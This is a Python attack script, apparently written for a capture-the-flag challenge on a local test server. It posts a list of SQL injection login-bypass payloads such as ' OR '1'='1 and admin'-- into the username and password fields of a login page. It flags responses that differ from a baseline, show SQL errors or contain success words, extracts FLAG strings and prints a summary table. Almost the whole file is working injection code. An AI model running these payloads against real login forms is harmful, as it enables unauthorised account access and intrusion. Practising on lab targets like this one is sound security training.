import requests
import time
import re

# Target URL
target_url = "http://127.0.0.1:32907/index.php"

# SQL injection payloads
payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "admin' #",
    "' OR '1'='1'--",
    "') OR ('1'='1",
    "' OR 'x'='x",
    '") OR ("1"="1',
    "' UNION SELECT NULL--"
]

# Get baseline (normal failed login)
print("[*] Getting baseline...")
baseline = requests.post(target_url, data={'username': 'normaluser', 'password': 'normalpass'}, 
                         allow_redirects=False, timeout=10)
baseline_status = baseline.status_code
baseline_length = len(baseline.content)
print(f"[+] Baseline: Status {baseline_status} | Length {baseline_length}B\n")

results = []

# Test username field
print("[*] Testing USERNAME field...")
for payload in payloads:
    data = {'username': payload, 'password': 'test123'}
    start = time.time()
    r = requests.post(target_url, data=data, allow_redirects=False, timeout=10)
    elapsed = time.time() - start
    
    diff = abs(len(r.content) - baseline_length) > 50 or r.status_code != baseline_status
    sql_err = any(e in r.text.lower() for e in ['sql', 'mysql', 'error', 'warning'])
    success = any(s in r.text.lower() for s in ['welcome', 'dashboard', 'logged', 'flag{'])
    
    results.append({
        'field': 'username',
        'payload': payload,
        'status': r.status_code,
        'length': len(r.content),
        'time': elapsed,
        'cookies': dict(r.cookies),
        'diff': diff,
        'sql_err': sql_err,
        'success': success,
        'text': r.text
    })
    
    if diff or sql_err or success:
        print(f"\n[!] {payload}")
        print(f"    Status: {r.status_code} | Length: {len(r.content)}B | Time: {elapsed:.3f}s")
        print(f"    Cookies: {dict(r.cookies)}")
        print(f"    SQL Error: {sql_err} | Success: {success}")
        print(f"    Response: {r.text[:400]}")
        
        # Check for flags
        flags = re.findall(r'FLAG\{[^}]+\}', r.text)
        if flags:
            for flag in flags:
                print(f"    [!!!] FLAG FOUND: {flag}")

# Test password field
print("\n\n[*] Testing PASSWORD field...")
for payload in payloads:
    data = {'username': 'admin', 'password': payload}
    start = time.time()
    r = requests.post(target_url, data=data, allow_redirects=False, timeout=10)
    elapsed = time.time() - start
    
    diff = abs(len(r.content) - baseline_length) > 50 or r.status_code != baseline_status
    sql_err = any(e in r.text.lower() for e in ['sql', 'mysql', 'error', 'warning'])
    success = any(s in r.text.lower() for s in ['welcome', 'dashboard', 'logged', 'flag{'])
    
    results.append({
        'field': 'password',
        'payload': payload,
        'status': r.status_code,
        'length': len(r.content),
        'time': elapsed,
        'cookies': dict(r.cookies),
        'diff': diff,
        'sql_err': sql_err,
        'success': success,
        'text': r.text
    })
    
    if diff or sql_err or success:
        print(f"\n[!] {payload}")
        print(f"    Status: {r.status_code} | Length: {len(r.content)}B | Time: {elapsed:.3f}s")
        print(f"    Cookies: {dict(r.cookies)}")
        print(f"    SQL Error: {sql_err} | Success: {success}")
        print(f"    Response: {r.text[:400]}")
        
        # Check for flags
        flags = re.findall(r'FLAG\{[^}]+\}', r.text)
        if flags:
            for flag in flags:
                print(f"    [!!!] FLAG FOUND: {flag}")

# Summary table
print("\n\n" + "="*80)
print("SUMMARY TABLE")
print("="*80)
print(f"{'Field':<10} | {'Payload':<22} | {'Status':<6} | {'Length':<8} | {'Time':<6} | {'Diff':<6} | {'SQL':<4} | {'Succ':<4}")
print("-"*80)

for r in results:
    print(f"{r['field']:<10} | {r['payload'][:22]:<22} | {r['status']:<6} | {r['length']:<8} | "
          f"{r['time']:.2f}s  | {'YES' if r['diff'] else 'NO':<6} | "
          f"{'YES' if r['sql_err'] else 'NO':<4} | {'YES' if r['success'] else 'NO':<4}")

print(f"\n[*] Total tests: {len(results)}")
print(f"[*] Interesting results: {sum(1 for r in results if r['diff'] or r['sql_err'] or r['success'])}")

